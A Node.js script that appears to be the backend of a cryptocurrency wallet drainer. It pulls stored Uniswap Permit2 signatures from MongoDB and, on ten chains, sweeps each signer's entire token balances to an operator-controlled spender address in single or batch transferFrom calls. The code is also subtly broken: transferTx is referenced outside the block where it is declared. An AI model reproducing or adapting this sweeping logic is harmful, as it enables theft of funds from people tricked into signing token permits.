require('dotenv').config();
const { MongoClient } = require('mongodb');
const { ethers } = require('ethers');
const { permit2Address } = require('@uniswap/permit2-sdk');

const networkConfig = {
    1: { //mainnet
      rpcUrl: process.env.MAINNET_URL,
      spenderAddress: process.env.MAINNET_SPENDER,
      permit2Address: process.env.MAINNET_PERMIT2
    },
    8453: { //base
      rpcUrl: process.env.BASE_URL,
      spenderAddress: process.env.BASE_SPENDER,
      permit2Address: process.env.BASE_PERMIT2
    },
    42161: { //arbitrum
      rpcUrl: process.env.ARBITRUM_URL,
      spenderAddress: process.env.ARBITRUM_SPENDER,
      permit2Address: process.env.ARBITRUM_PERMIT2
    },
    56: { //bsc
      rpcUrl: process.env.BSC_URL,
      spenderAddress: process.env.BSC_SPENDER,
      permit2Address: process.env.BNB_PERMIT2
    },
    10: { //optimism
      rpcUrl: process.env.OPTIMISM_URL,
      spenderAddress: process.env.OPTIMISM_SPENDER,
      permit2Address: process.env.OPTIMISM_PERMIT2
    },
    7777777: { //zora
      rpcUrl: process.env.ZORA_URL,
      spenderAddress: process.env.ZORA_SPENDER,
      permit2Address: process.env.ZORA_PERMIT2
    },
    43114: { //avalanche
      rpcUrl: process.env.AVALANCHE_URL,
      spenderAddress: process.env.AVALANCHE_SPENDER,
      permit2Address: process.env.AVALANCHE_PERMIT2
    },
    137: { //polygon
      rpcUrl: process.env.POLYGON_URL,
      spenderAddress: process.env.POLYGON_SPENDER,
      permit2Address: process.env.POLYGON_PERMIT2
    },
    324: { //zksync
      rpcUrl: process.env.ZKSYNC_URL,
      spenderAddress: process.env.ZKSYNC_SPENDER,
      permit2Address: process.env.ZKSYNC_PERMIT2

    },
    81457: { //BLAST
      rpcUrl: process.env.BLAST_URL,
      spenderAddress: process.env.BLAST_SPENDER,
      permit2Address: process.env.BLAST_PERMIT2
    }
  
  }

const MONGO_URI = process.env.MONGO_URI;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const client = new MongoClient(MONGO_URI);

async function batchTransferTokens() {
  try {
    await client.connect();
    const db = client.db('permit2DB');
    const permitsCollection = db.collection('permits');

    const permits = await permitsCollection.find({ submitted: true, executed: { $ne: true } }).toArray();
    if (permits.length === 0) {
      console.log('No submitted permits found to transfer');
      return;
    }

    const currentTimestamp = Math.floor(Date.now() / 1000);

    for (const permitData of permits) {
      const { owner, permitBatch, chainId } = permitData;

      if (!chainId || !networkConfig[chainId]) {
        console.log(`Unsupported chainId ${chainId} for owner: ${owner}`);
        continue;
      }

      const { rpcUrl, spenderAddress, permit2Address } = networkConfig[chainId];
      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

      // Use Permit2's AllowanceTransfer for batch transfers
      const permit2Contract = new ethers.Contract(permit2Address, [
        'function transferFrom(address[] calldata owners, tuple(address token, uint160 amount)[] calldata transferDetails, address to) external',
        'function transferFrom(address owner, address to, uint160 amount, address token) external', // Single transfer
      ], wallet);

      const erc20Abi = ['function balanceOf(address owner) view returns (uint256)'];

      console.log(`Processing batch transfers for owner: ${owner} on chainId: ${chainId}`);

      const validTokens = permitBatch.details.filter(detail => currentTimestamp <= detail.expiration);
      if (validTokens.length === 0) {
        console.log('All token permits have expired');
        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { executed: true, executedAt: new Date(), reason: 'All permits expired' } }
        );
        continue;
      }

      // Prepare batch transfer data
      const transferDetails = [];
      const owners = [];
      
      for (const detail of validTokens) {
        try {
          const tokenContract = new ethers.Contract(detail.token, erc20Abi, provider);
          const balance = await tokenContract.balanceOf(owner);
          
          if (balance.isZero()) {
            console.log(`No balance to transfer for ${detail.token}`);
            continue;
          }

          const maxUint160 = ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
          const amount = balance.gt(maxUint160) ? maxUint160 : balance;

          transferDetails.push({
            token: detail.token,
            amount: amount
          });
          owners.push(owner);

        } catch (error) {
          console.error(`Error checking balance for ${detail.token}:`, error);
          continue;
        }
      }

      if (transferDetails.length === 0) {
        console.log('No tokens to transfer');
        continue;
      }

      try {
        // SINGLE TRANSACTION FOR ALL TOKENS
        if (transferDetails.length === 1) {
          // Single token transfer
          const detail = transferDetails[0];
          const transferTx = await permit2Contract.transferFrom(
            owner,
            spenderAddress, // recipient
            detail.amount,
            detail.token,
            { gasLimit: 150000 }
          );
          await transferTx.wait();
          console.log(`Single transfer completed: ${transferTx.hash}`);
        } else {
          // Batch transfer for multiple tokens
          const transferTx = await permit2Contract.transferFrom(
            owners, // array of owners (all same owner in your case)
            transferDetails, // array of {token, amount}
            spenderAddress, // recipient
            { gasLimit: 200000 + (transferDetails.length * 50000) } // Dynamic gas limit
          );
          await transferTx.wait();
          console.log(`Batch transfer completed for ${transferDetails.length} tokens: ${transferTx.hash}`);
        }

        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { executed: true, executedAt: new Date(), transferHash: transferTx.hash } }
        );
        console.log(`Transfers marked as executed for owner: ${owner}`);
        
      } catch (transferError) {
        console.error(`Batch transfer failed:`, transferError);
        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { executed: true, executedAt: new Date(), reason: transferError.message } }
        );
        continue;
      }
    }
  } catch (error) {
    console.error('Transfer failed:', error);
  } finally {
    await client.close();
  }
}

batchTransferTokens().then(() => {
  console.log('Batch transfer complete');
  process.exit(0);
}).catch((error) => {
  console.error('Script failed:', error);
  process.exit(1);
});